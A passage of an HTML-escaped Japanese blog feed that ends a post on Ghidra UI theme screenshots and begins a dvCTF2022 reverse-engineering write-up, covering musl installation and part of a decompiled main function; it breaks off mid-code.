              srcset=&quot;/static/76592cfa96f0184b7294437164e84f9e/8ac56/image-20220307204726489.webp 240w,
/static/76592cfa96f0184b7294437164e84f9e/d3be9/image-20220307204726489.webp 480w,
/static/76592cfa96f0184b7294437164e84f9e/e46b2/image-20220307204726489.webp 960w,
/static/76592cfa96f0184b7294437164e84f9e/b671e/image-20220307204726489.webp 1083w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/76592cfa96f0184b7294437164e84f9e/8ff5a/image-20220307204726489.png 240w,
/static/76592cfa96f0184b7294437164e84f9e/e85cb/image-20220307204726489.png 480w,
/static/76592cfa96f0184b7294437164e84f9e/d9199/image-20220307204726489.png 960w,
/static/76592cfa96f0184b7294437164e84f9e/eb4a1/image-20220307204726489.png 1083w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/76592cfa96f0184b7294437164e84f9e/d9199/image-20220307204726489.png&quot;
            alt=&quot;image-20220307204726489&quot;
            title=&quot;image-20220307204726489&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Metal&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8a3e88347bf6b5380148c3828b6c9ed5/25260/image-20220307204806192.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAAChUlEQVQ4y5VT2W7TQBT1p/EP/AsPSEi88Yj4AX6BRSDapknT0jhOydY0XrI7ceI4jnfHS5zlcD1B8ABU6khHd+yZuTP3nHM5nhcgyRJkWUZVENBoNNHtdqEoCnr9PoajETRtjp4ygNKXMFCHqHea6DzImGgq9KUBy9TxsSDjxdsmuFL5Go1WG2NVowQDqNMZlsYKa8uG5/kIww0c1yO4cBwP5noNUZQxVmYwTQe268P3HXwqKHj5rgUu3MQ4HA7YRAn8IEQ+dlkG17IogY0gCJAkMSHBbpex6Ac+ndkjo33b7ZbmO4ynJoTWHFyUZCxJttvDdlyWPAwDtNptKkvERJ1ivtDZqy3bYcj35RVYts2+87lLFQSBB+662gTflPCgjGDThuMR9NoQ5R83aHb7mGkLGKYFY7XG8hHoxhqLpQluOBzBMAw6sGK3HA5HVr620OifSRwFCKOUkDyKTZzCckNwKXGQj7zUnK8TnzGi5PT/KSNOt+B8/yREus3g+X8SBmH0+6Ij8fAYDjlPNPJXcre338lzfUjkM3NtnUTZRIiT9MkvTNIM3MWXD+iQrxRJgkccsgUqdzzV4XgB82BAXvwv6PI8biguTBec2L0nUXREcUJWuUelwkOo1SC0uxD7KjO8zpS0/om5vmLq5ipPF6SyT5mPxwP2+z3rgg3dZq5XGM5kUt2jLvCpY7y/4P7CjNpyrhvMjwZRxuU+i+MIpuVQBwQnteIYskQ0UH/3egrrc0kSKZ56PsdwOKAe1wgzFicTFSJ5mfv6+Qx3jQdUhDaqd/eo1Tvgay2UylUUyzyKVzwKxVtcliq4KN7g23kJZxdXOC9cs/VLWq/W6nj15j2ePX+Nn8cpD8OAcUskAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8a3e88347bf6b5380148c3828b6c9ed5/8ac56/image-20220307204806192.webp 240w,
/static/8a3e88347bf6b5380148c3828b6c9ed5/d3be9/image-20220307204806192.webp 480w,
/static/8a3e88347bf6b5380148c3828b6c9ed5/e46b2/image-20220307204806192.webp 960w,
/static/8a3e88347bf6b5380148c3828b6c9ed5/9bbd4/image-20220307204806192.webp 1113w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8a3e88347bf6b5380148c3828b6c9ed5/8ff5a/image-20220307204806192.png 240w,
/static/8a3e88347bf6b5380148c3828b6c9ed5/e85cb/image-20220307204806192.png 480w,
/static/8a3e88347bf6b5380148c3828b6c9ed5/d9199/image-20220307204806192.png 960w,
/static/8a3e88347bf6b5380148c3828b6c9ed5/25260/image-20220307204806192.png 1113w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8a3e88347bf6b5380148c3828b6c9ed5/d9199/image-20220307204806192.png&quot;
            alt=&quot;image-20220307204806192&quot;
            title=&quot;image-20220307204806192&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nimbas&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/475fee20a812738778ee53ef12eb054c/62a6a/image-20220307204855497.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.91666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC+klEQVQ4y5VT22oTURSdP9F6ofodgiIiaB/8A39A8EkQWpBWUCk+qlCjWC8lbVqr9kF6IffJdZLMTGYmmZkkpjXT3NrmflvuOS21KigeWKyz9zmzZ++19+FkWYMoKbBZyxhQ1SzktEq2Ck0zoBt56Hoe2ayJrJ6DRmya32AYBWQyJvKFbfChBMbHr+DU6UvgPP4QAqEYvq5vYX3DDa+fhz8YQSiSQEyQkBAVRCIifDyPqJDEJu/HxlYQwZiAlKJBUrJkB3Dh4jWMnbkKjg+HISt2Vhosy0KpZKFSqaJWq2Nv/wD1vX3U63XCHqrkExIiTC0Hq1hh9kGjgVRKwdnz1zF27gY40BoOh9gtV+0t+v0+KqUSLBa4ggZ90Gy20O120el0UKafdWjf6/eYze5Xa3C7I7hzdxbcYAi02h3sfLcwIKNN+yAfhdtnlyhSySqkdBZKJseg6YXDvZY7Zlk1UaVKph+9Auda28TahhdqRmcZ9rp9uENefN4MUMA0YgkbyhGnT/h+IhyTSDYd9yafgyuXyyiRdoXiDiu93e4ikRSoMSHWFCNXhJnf/it0swirXMHU9KtDDe1VssoUcIQG6bVLh/+zRqMR44dP3oGzjWarjeKOxQ4ajSYJX/vl4r/W8Oje9OwiuGRKQjQuksAmc9oB84UiWpSp3d1Gs8l8f8P+QYO63cWDWSe4LU8IHk8QmazBAg4GA/BREd6wiJSkMrEPO2wed/p3W1YNZEjH+zMvweVMg5VoD6zP54ffH8S624NNbwiRuISIILPO/gHqrn0ejonEMgs6OfMMXI9S7XV7NIclNsgVGvBAPAhBSiOt5dmMpU9CM5nPhj2jQlKh56dDz21j+vELcK1WB6XdGqxK/VhkgebOz8fB03sOEPuCMfgCUcZeYvvMzjCeUhFPqpSxDIkynJp5Cm7RtYr3Cy4sOFewvPIZS8uf4Hj9FnOON3jpmMf8uwU4nS6GDwtOuFzLWP34EZ9WV7HoXMIX4rk5B25N3MTticv4AYRgIju+TNakAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/475fee20a812738778ee53ef12eb054c/8ac56/image-20220307204855497.webp 240w,
/static/475fee20a812738778ee53ef12eb054c/d3be9/image-20220307204855497.webp 480w,
/static/475fee20a812738778ee53ef12eb054c/e46b2/image-20220307204855497.webp 960w,
/static/475fee20a812738778ee53ef12eb054c/e6b69/image-20220307204855497.webp 1122w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/475fee20a812738778ee53ef12eb054c/8ff5a/image-20220307204855497.png 240w,
/static/475fee20a812738778ee53ef12eb054c/e85cb/image-20220307204855497.png 480w,
/static/475fee20a812738778ee53ef12eb054c/d9199/image-20220307204855497.png 960w,
/static/475fee20a812738778ee53ef12eb054c/62a6a/image-20220307204855497.png 1122w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/475fee20a812738778ee53ef12eb054c/d9199/image-20220307204855497.png&quot;
            alt=&quot;image-20220307204855497&quot;
            title=&quot;image-20220307204855497&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CDE/Motif&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/10e1c062a8ccd68b6958de548b38a019/f43e4/image-20220307204940483.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACyElEQVQ4y42Ta08TaRTH5+v4JXyxH2Bf+y18sftms280ujFxKYUWaul1pjPT6W2Gaafl0haWQMEuG1kWWlZEi1aIdwNSQY3Jz2ce1DXxtpP8cs5kznPmXP6PkrOblJyGoE4252FYHlZ+SvjvEX7RniOXr5Mr1ciJWKNUpeTOU3Sb2O4C5fIc54NNfvh1CSWWNplIZknrFWbqC1xv/0X7zzU2O9tsdm/R3bpNp7sj3ztb27RX/8b1Gqy21rmxfpPuzR6djS6/RJc4+/M8SlwtEhrXCIQ0tv7t8ebNW549fc6j/Qfs7z/kqfAPDl5Ijo5e8vjxc3q7ewwGLzk8HHBweMTgaMDy+i6J8hpKJGETvmYSGFX5Z3Ob4+NX4sB9CnYdqzAtbIPi5Lxk0lukXGvhTS1L3/WWJL4/U7+OU1lAUQ2XlOaQ0suivTscn7zmbv8eUTOHmq2LGf0hDixJnMriV5n0WiT1KkpCLXAtZhKOGmJmO5yIhL3dPgnVJBhWiSYKwneIpx0SPurnxNO2KMpldFxHGR7PypaHRlQ2Orc+JowlCzIgFDGk/R6nOVIoV4IqkQlLznCj81+FsVRRBBoy8P8wFvVzpFFGoxmsXJW0WaUrtny6lL5oNf9JhZlvVjcylpFxAb/CeMJEt6okU7Zcii+bu/f20LNVoc+inJEmfqYZ3ldRjYrIMUU4VkAJBse48ntEtldvLrKy0qY5t4BVmha3RtwSZw5vekXIZZnK1Jfxv9Vm2sT9LV8Na3KboYjOzu0er05O6O/10W0Xu9xistrCrviS+TJWsUHemRfaXEHLTqNMpBzyxVmMwiz9+w/wnydPnonqamRMcbezp1YTbfn2A1ZhRoi+Sb7UkDZt1rg0nEG5PJQhGC8TiDqMJFxCyTLDMZvfQiaXR00ujRhcDGYkF4a196hcCKRPGUpxNaRz9txPKGd+5B0srlt4YInM6QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/10e1c062a8ccd68b6958de548b38a019/8ac56/image-20220307204940483.webp 240w,
/static/10e1c062a8ccd68b6958de548b38a019/d3be9/image-20220307204940483.webp 480w,
/static/10e1c062a8ccd68b6958de548b38a019/e46b2/image-20220307204940483.webp 960w,
/static/10e1c062a8ccd68b6958de548b38a019/928c4/image-20220307204940483.webp 1120w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/10e1c062a8ccd68b6958de548b38a019/8ff5a/image-20220307204940483.png 240w,
/static/10e1c062a8ccd68b6958de548b38a019/e85cb/image-20220307204940483.png 480w,
/static/10e1c062a8ccd68b6958de548b38a019/d9199/image-20220307204940483.png 960w,
/static/10e1c062a8ccd68b6958de548b38a019/f43e4/image-20220307204940483.png 1120w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/10e1c062a8ccd68b6958de548b38a019/d9199/image-20220307204940483.png&quot;
            alt=&quot;image-20220307204940483&quot;
            title=&quot;image-20220307204940483&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/820427247dbeca834901edf2cf8ef86f/b5cea/image-20220307205101246.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 71.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACaElEQVQ4y41Ty27TUBD1D7JGQkKseXwAS/gONqxgUQkWBSE1KU1QAdFXmrhOYsdJE8fxK7bj9ytpDnNvEygSpYx0NPd5ZubcucJsJCH0PXi2Ad8xEPkOIs9GOLe4TxYOishH4ru0ZyINXYSBhTz2kUUuyiRA5s9QfXiG9c4DCPVPH9GRJPT7Mr4cHuL45BQXNFcGKrSpjqk+w0TToKqXUFQFo/EIB4ffcC5KMBwbmm7iUpVRvHkIvL4HYdg9g2lb8DwPQRCgKApUVYU8TZFlGR9XVcmxWq34Gc92UcQlyoLWl0uEro307ROUr+5DKKMAzNjFOI5xdXXFLzqGCW0ygW1T+WGIJE54sDzPkZMvKQCbl2VJaxkF8DHrn0Owpho/sFgsEEURJ2MQZRG9wYgTzudzXsGtcEnXJIXSkyB8bRxAVhQM1MEvwiWVcSG30On2YZomfN//J6HLCOlur92CENFhZiz1bcks45TGq1XF53fZer3mfqyqRBhsNNwQroiAaROTZtvDd2EbdEidISjKgBPNLIfEvy6ZCZ8kCf7XthkO1SGEnffvIFHfdToiUmoVZiziTT2vW+d2FNQ+zPqyAqF5UOPCO/Saw9EI4/GEMMZkrG1E9zk5Ez36C2KqhHmm+3FLhCDJEu+jqlpSpl2ebbfbQ7t7AsM04M5d3lI34S9+v/p0OoWu6/ylfxwdQ9ANi6ebZvkfL6qbGizLguM4vAIGa+NtWl9Qd7Bfw/ZZnzLdO+IFhN3dXRqI+H50gtOzFh+ft9toNJrYq9VQ39/nvlavc7/HPOFzo4FGs8n/P5s/f/ESjx4/xU98KBOU4+qSSQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/820427247dbeca834901edf2cf8ef86f/8ac56/image-20220307205101246.webp 240w,
/static/820427247dbeca834901edf2cf8ef86f/d3be9/image-20220307205101246.webp 480w,
/static/820427247dbeca834901edf2cf8ef86f/e46b2/image-20220307205101246.webp 960w,
/static/820427247dbeca834901edf2cf8ef86f/c89f9/image-20220307205101246.webp 1140w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/820427247dbeca834901edf2cf8ef86f/8ff5a/image-20220307205101246.png 240w,
/static/820427247dbeca834901edf2cf8ef86f/e85cb/image-20220307205101246.png 480w,
/static/820427247dbeca834901edf2cf8ef86f/d9199/image-20220307205101246.png 960w,
/static/820427247dbeca834901edf2cf8ef86f/b5cea/image-20220307205101246.png 1140w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/820427247dbeca834901edf2cf8ef86f/d9199/image-20220307205101246.png&quot;
            alt=&quot;image-20220307205101246&quot;
            title=&quot;image-20220307205101246&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows Classic&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/972cbc9069970bc3a2bd328c8fbe3f4e/0940f/image-20220307205028221.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 70.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACh0lEQVQ4y42TSW/TQBTH/RXhhlCvwJEjfBUuICGVIvVQBIILbajapA2lWZzETmwn3mO7Tpw4XrP+meeQqhxKedLTLJr5zVv+w0m1EjxzAGfQg6dJGFsD5n2MDAWBqSB0VCS+icg1MHUHiHwDoc/2xiZiX0Ma2IhtAcujZ9gc7oErffsMviNCVvooX1zi6rqGVkeA2JOh6gZ008JA0yHLKkSpC0UdoFS+QKMtwHIdqKYDTepgsf8EeP8IHF85ZhcGcF0XnudiMplgNpshmoVIkhh5liFNU+YJ5nmO0ciHqRqYBRHSJEGa5Zg4OrJ3T7F68xhcODRAtlgsCtBqtcJms4HvuNA1FY7jYDqdIgxn7IEEURQhjmNkWVqs6bE4ChEOFYzb5+CMnoh8voXRxfl8jjWDdqQ2WkIXQ3vIIvfg+z6LboTxeFw4ze96EKWwlS64k69f0OB5iF0RQRAUkVKUrV4d9VYbJqshXSDgfX5zc4PROIDaqoGz+kqRcsZqRekQMM/niMIQy0XG4Gs8ZFQiMluRwLmWVSxWqyUSVpstMGc1C/+68C9fr7ePqrIMrt5oso7O4PkjTBlksZgX0e6AD8HuAvuyAu7th3102m3wTb6QDBkdoPT/13Yp9wh49OkQlmnCZfJQVQ2apsEwDEgkbLa2bfvepuw6TE0JggnOf16DO6tWmDgTrFhUYreLJt+EwH5KrVWFrmvwXO9WKreS+SMbglqsByQryu7i6gocaY0sipNCgzsbetuDPnudfhFlQCMJnfYJTDIbMSjBlqyZzXYH3MeDAwhMg79qDdSbfBGlIAoolys4KZXw4/S0GLd+cjs/K5+jXKngslrF9+NjvHz1GnvPX+A3gLINTWPlNogAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/972cbc9069970bc3a2bd328c8fbe3f4e/8ac56/image-20220307205028221.webp 240w,
/static/972cbc9069970bc3a2bd328c8fbe3f4e/d3be9/image-20220307205028221.webp 480w,
/static/972cbc9069970bc3a2bd328c8fbe3f4e/e46b2/image-20220307205028221.webp 960w,
/static/972cbc9069970bc3a2bd328c8fbe3f4e/e3efe/image-20220307205028221.webp 1154w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/972cbc9069970bc3a2bd328c8fbe3f4e/8ff5a/image-20220307205028221.png 240w,
/static/972cbc9069970bc3a2bd328c8fbe3f4e/e85cb/image-20220307205028221.png 480w,
/static/972cbc9069970bc3a2bd328c8fbe3f4e/d9199/image-20220307205028221.png 960w,
/static/972cbc9069970bc3a2bd328c8fbe3f4e/0940f/image-20220307205028221.png 1154w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/972cbc9069970bc3a2bd328c8fbe3f4e/d9199/image-20220307205028221.png&quot;
            alt=&quot;image-20220307205028221&quot;
            title=&quot;image-20220307205028221&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Ghidraの設定ファイルをちょくせつ編集するともっと細かいUIカスタマイズもできますが、僕の環境では特にいじっていないので割愛します。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;また環境を変えたら記事もアップデートします。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[dvCTF2022 Writeup Mini Game(Rev)]]></title><link>https://kashiwaba-yuki.com/ctf-dvctf-2022</link><guid isPermaLink="false">https://kashiwaba-yuki.com/ctf-dvctf-2022</guid><pubDate>Sun, 13 Mar 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;3/12から開催されていた&lt;a href=&quot;https://dvc.tf/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;dvCTF&lt;/a&gt;に参加したので簡単にWriteupを書きました。&lt;/p&gt;
&lt;h2 id=&quot;mini-gamerev&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mini-gamerev&quot; aria-label=&quot;mini gamerev permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Mini Game(Rev)&lt;/h2&gt;
&lt;p&gt;ダウンロードしたファイルを実行しようと思ったのですが、&lt;code class=&quot;language-text&quot;&gt;no such file or directory&lt;/code&gt;のエラーで実行できませんでした。&lt;/p&gt;
&lt;p&gt;以下の記事を参考にしたところ、&lt;code class=&quot;language-text&quot;&gt;alpine&lt;/code&gt;でビルドしたバイナリの場合Ubuntuのような&lt;code class=&quot;language-text&quot;&gt;glibc&lt;/code&gt;を使ったディストリビューションでは必要なライブラリが無いために実行できないようでした。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/hrkt/items/6a2169b021e756eb32e2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;バイナリが「no such file or directory」の時〜またはalpineでビルドしたものを他のlinuxで動かす時にありがちなポイント - Qiita&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そのため、以下のコマンドで&lt;code class=&quot;language-text&quot;&gt;musl libc&lt;/code&gt;をインストールしました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; musl-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでバイナリを実行できるようになります。&lt;/p&gt;
&lt;p&gt;続いて、Ghidraでデコンパイルをしてみました。&lt;/p&gt;
&lt;p&gt;動的解析のためにGhidraのイメージベースを&lt;code class=&quot;language-text&quot;&gt;0x555555554000&lt;/code&gt;に変更しておきました。&lt;/p&gt;
&lt;p&gt;以下はデコンパイルした&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数の抜粋です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// main関数&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;check_input&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;input_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xac&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
iVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_555555558420 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;i &lt;span class=&quot;token 